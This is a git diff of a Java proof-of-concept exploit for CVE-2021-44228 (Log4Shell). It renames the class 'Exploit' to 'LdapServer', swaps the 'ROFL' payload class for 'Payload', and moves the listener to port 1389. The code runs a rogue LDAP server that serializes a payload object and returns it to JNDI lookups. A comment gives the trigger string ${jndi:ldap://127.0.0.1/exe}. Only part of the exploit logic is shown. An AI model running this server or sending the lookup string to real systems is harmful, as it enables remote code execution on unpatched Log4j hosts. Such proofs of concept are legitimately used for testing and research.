@@ -1,3 +1,14 @@
+package ldap;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.net.InetAddress;
+import java.util.logging.ConsoleHandler;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
 import com.unboundid.ldap.listener.InMemoryListenerConfig;
@@ -7,25 +18,16 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import rofl.ROFL;
 
-import javax.net.ServerSocketFactory;
-import javax.net.SocketFactory;
-import javax.net.ssl.SSLSocketFactory;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
-import java.io.ObjectOutputStream;
-import java.net.InetAddress;
-import java.util.logging.ConsoleHandler;
-import java.util.logging.Handler;
+import payload.Payload;
 
 /**
  * This is a proof of concept implementation of CVE-2021-44228 (https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
  */
-public class Exploit {
+public class LdapServer {
 
 	public static void main(String... args) throws Exception {
-		final var port = 389;
+		final var port = 1389;
 
 		try {
 			final var config = new InMemoryDirectoryServerConfig("dc=exploit,dc=com");
@@ -65,8 +67,8 @@ public class Exploit {
 		// Works only if the system property com.sun.jndi.ldap.object.trustURLCodebase is true
 		// ${jndi:ldap://127.0.0.1/exe}
 		private void sendExeResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException, ClassNotFoundException {
-			final var send = new ROFL();
-			final var location = Exploit.class.getResource("").toString();
+			final var send = new Payload();
+			final var location = LdapServer.class.getResource("").toString();
 
 			final var serializedStream = new ByteArrayOutputStream();
 			final var objectStream = new ObjectOutputStream(serializedStream);
